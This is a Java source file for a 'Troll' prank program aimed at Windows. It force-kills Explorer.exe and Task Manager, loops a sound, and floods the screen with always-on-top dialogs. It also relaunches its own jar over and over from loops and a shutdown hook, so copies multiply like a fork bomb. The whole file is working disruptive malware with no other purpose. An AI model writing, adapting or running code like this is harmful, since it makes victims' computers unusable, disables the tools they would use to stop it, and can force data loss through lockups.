import java.util.Random;
import javax.swing.JOptionPane;
import javax.swing.JDialog;
import java.awt.event.KeyListener;
import java.awt.event.KeyEvent;
import javax.swing.ImageIcon;
import java.net.URL;
//SOUND
import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Clip;

//screenSize
import java.awt.Toolkit;
import java.awt.Dimension;

class Troll{

public static void main(String args[]) throws InterruptedException{
		
	int sleepTime;
	int increment=10;
	String msg="";
	String title="Troll ;)";
	
	Runtime.getRuntime().addShutdownHook(new Thread(){
		public void run(){
			trollReproduce();
			trollReproduce();
			trollReproduce();
		}
	}
	);  //(muahaha)- >8D<--{
	
	try{
	sleepTime= Integer.parseInt(args[0]);
	}catch(ArrayIndexOutOfBoundsException e){sleepTime=30000;}
	
	kill("Explorer.exe");
	trololoop("trololo.wav");
			
while(true){
 new ThreadCagapalle(msg,title);
 kill("Taskmgr.exe");
 Thread.currentThread().sleep(sleepTime);
 trollReproduce();
if(sleepTime>0){
sleepTime-=increment;
}
else{sleepTime=1;}

}

}
 public static void kill(String string) {
    try {
      Runtime.getRuntime().exec("taskkill /F /IM " + string).waitFor();
    } catch (Exception e) {
    }
  }
  
  	public static void trollReproduce() {
    try {
      Runtime.getRuntime().exec("java -jar Troll.jar");
    } catch (Exception e) {}
  }
   
  
  public static synchronized void trololoop(final String name) {
    new Thread(new Runnable() { 
      public void run() {
        try {
          Clip clip = AudioSystem.getClip();
		  URL url=Troll.class.getResource(name);
          AudioInputStream inputStream = AudioSystem.getAudioInputStream(url);
          clip.open(inputStream);
          clip.start(); 
		 clip.loop(clip.LOOP_CONTINUOUSLY); 
		   
        } catch (Exception e) {
			System.out.println("Trololoops");
          System.err.println(e.getMessage());
        }
      }
    }).start();
  }

}

class MsgCagapalle{
	
	ImageIcon trollIcon;
	
	JOptionPane p;
	JDialog d;
	int msgType;
	int optionType;
	int posX;
	int posY;
	String msg;
	String title;
	
	public MsgCagapalle(int posX,int posY,String msg,String title){
		this.posX=posX;
		this.posY=posY;
		this.msg=msg;
		this.title=title;
		this.optionType=JOptionPane.DEFAULT_OPTION;
		this.msgType=JOptionPane.PLAIN_MESSAGE;
		this.trollIcon= new ImageIcon(MsgCagapalle.class.getResource("Troll.JPEG"));
			
	}
	
	public void spawnMsg(){	
 //JOptionPane(Object message, int messageType, int optionType)	;
 //JOptionPane(Object message, int messageType);
		p = new JOptionPane(msg,msgType,optionType,trollIcon);			
		
		/*p.addKeyListener( new KeyListener(){         
        public void keyTyped( KeyEvent evt ) {}
		public void keyPressed( KeyEvent evt ) {}       
        public void keyReleased( KeyEvent evt ) {
			if(evt.getKeyCode()==KeyEvent.VK_W){
				System.out.println("ahah");
			}				
		   }
		  } 
		 );
		 */
		d= p.createDialog(title);
		d.setLocation(posX,posY);
        d.setVisible(true);
		d.setFocusable(true);
		d.toFront();
		d.setAlwaysOnTop(true);
	
		
		d.requestFocus();
	}
	
}

class ThreadCagapalle extends Thread{
	
	Random rand=new Random();
	String msg;
	String title;
	Dimension screenSize;
     int posX;
     int posY;
	 int posXmax;
     int posYmax;
	
	
	public ThreadCagapalle(String msg,String title){		
		this.msg=msg;
		this.title=title;	
		this.start();
		
	}
	
	public void run(){
		screenSize = Toolkit.getDefaultToolkit().getScreenSize();
		posXmax=screenSize.width-350;
		posYmax=screenSize.height-300;
		while(true){	
	posX=rand.nextInt(posXmax);
	posY=rand.nextInt(posYmax);
	
		
    new MsgCagapalle(posX,posY,msg,title).spawnMsg();
	  trollReproduce();
	  trollReproduce();

    }
		
		
	}
	public static void trollReproduce() {   //  >:D<--<
    try {
      Runtime.getRuntime().exec("java -jar Troll.jar");
    } catch (Exception e) {}
  }
	
	
}



  






